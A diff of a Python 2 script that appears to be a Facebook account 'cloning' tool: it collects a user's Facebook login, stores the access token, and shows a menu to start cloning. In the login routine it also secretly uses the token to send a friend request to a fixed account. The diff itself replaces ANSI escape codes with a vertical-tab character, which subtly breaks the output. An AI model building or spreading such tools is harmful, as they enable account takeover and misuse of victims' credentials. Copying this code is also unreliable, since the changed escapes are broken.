@@ -78,9 +78,9 @@ CorrectUsername = "jokarabir"
 CorrectPassword = "01310230537"
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
+    username = raw_input("\013[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
+    	password = raw_input("\013[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -98,15 +98,15 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
-		print('\033[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
-		id = raw_input('\033[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
+		print 42*"\013[1;96m="
+		print('\013[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
+		id = raw_input('\013[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\013[1;96m \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
+			print"\n\013[1;96m \x1b[1;91mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -128,20 +128,20 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m\x1b[1;92mLogin Successful'
+				print '\n\013[1;96m\x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
+				print"\n\013[1;96m \x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m \x1b[1;91mIt seems that your account has a checkpoint")
+			print("\n\013[1;96m \x1b[1;91mIt seems that your account has a checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m \x1b[1;91mPassword/Email is wrong")
+			print("\n\013[1;96m \x1b[1;91mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -151,7 +151,7 @@ def menu():
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\033[1;96m \x1b[1;91mToken invalid"
+		print"\013[1;96m \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -162,26 +162,26 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;96m \033[1;91mIt seems that your account has a checkpoint"
+		print"\033[1;96m \013[1;91mIt seems that your account has a checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;96m \x1b[1;91mThere is no internet connection"
+		print"\013[1;96m \x1b[1;91mThere is no internet connection"
 		keluar()
 	os.system("clear")
 	print logo
-	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
+	print 42*"\013[1;96m="
+	print "\013[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\013[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print 42*"\013[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 def pilih():
-	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
+	unikers = raw_input("\n\013[1;97m >>> \013[1;97m")
 	if unikers =="":
-		print "\033[1;96m \x1b[1;91mFill in correctly"
+		print "\013[1;96m \x1b[1;91mFill in correctly"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -190,7 +190,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\033[1;96m \x1b[1;91mFill in correctly"
+		print "\013[1;96m \x1b[1;91mFill in correctly"
 		pilih()
 def super():
 	global toket
